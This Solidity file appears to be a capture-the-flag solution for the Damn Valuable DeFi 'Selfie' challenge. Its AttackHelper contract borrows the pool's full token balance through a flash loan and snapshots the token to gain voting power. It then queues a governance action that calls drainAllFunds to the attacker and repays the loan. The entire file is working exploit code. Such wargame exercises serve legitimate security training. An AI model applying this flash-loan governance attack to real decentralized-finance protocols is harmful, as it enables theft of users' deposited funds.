// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";
import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";

contract AttackHelper {
    DamnValuableTokenSnapshot public immutable dvts;
    SelfiePool public immutable pool;
    SimpleGovernance public immutable governance;
    address public immutable attacker;
    uint256 public actionId;

    constructor(address poolAddress, address governanceAddress) {
        pool = SelfiePool(poolAddress);
        governance = SimpleGovernance(governanceAddress);
        dvts = governance.governanceToken();
        attacker = msg.sender;
    }

    function attackGovernance() external {
        uint256 amount = dvts.balanceOf(address(pool));
        pool.flashLoan(amount);
    }

    function receiveTokens(address token, uint256 amount) external {
        DamnValuableTokenSnapshot(token).snapshot();
        actionId = governance.queueAction(
            address(pool),
            abi.encodeWithSignature("drainAllFunds(address)", attacker),
            0
        );
        DamnValuableTokenSnapshot(token).transfer(address(pool), amount);
    }
}
